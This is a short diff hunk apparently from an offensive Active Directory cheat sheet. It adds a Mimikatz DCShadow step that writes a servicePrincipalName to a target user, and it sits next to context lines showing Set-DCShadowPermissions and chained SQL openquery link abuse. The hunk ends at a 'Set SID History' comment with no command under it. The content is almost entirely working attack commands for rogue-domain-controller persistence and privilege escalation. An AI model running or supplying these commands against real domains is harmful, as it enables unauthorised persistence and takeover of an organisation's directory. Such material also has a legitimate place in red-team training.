@@ -871,3 +871,9 @@ select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt","sele
 # Setting the permissions
 Set-DCShadowPermissions -FakeDC corp-user1 -SAMAccountName root1user -Username user1 -Verbose
 ```
+**2. Use Mimikatz to stage the DCShadow attack:**
+```powershell
+# Set SPN for user
+lsadump::dcshadow /object:TargetUser /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"
+# Set SID History for user
+```
